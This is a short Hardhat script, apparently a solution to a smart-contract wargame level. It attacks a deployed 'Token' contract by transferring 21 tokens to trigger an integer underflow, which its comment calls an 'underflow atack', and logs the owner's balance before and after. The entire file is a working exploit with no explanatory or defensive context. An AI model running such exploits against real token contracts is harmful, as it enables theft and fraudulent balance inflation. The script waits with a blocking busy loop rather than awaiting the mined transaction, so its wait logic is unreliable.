const hre = require("hardhat");

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0x26867cCaA401b534abD285570e9F96343Cff28C7"
  );
  const Contract = await hre.ethers.getContractFactory("Token");
  const contractInstance = await Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  console.log(
    "balance before ",
    await contractInstance.connect(owner).balanceOf(owner.address)
  );

  await contractInstance.connect(owner).transfer(contractAddress, 21); // underflow atack

  sleep(10000); // wait for the transaction to be mined

  console.log(
    "balance after ",
    await contractInstance.connect(owner).balanceOf(owner.address)
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
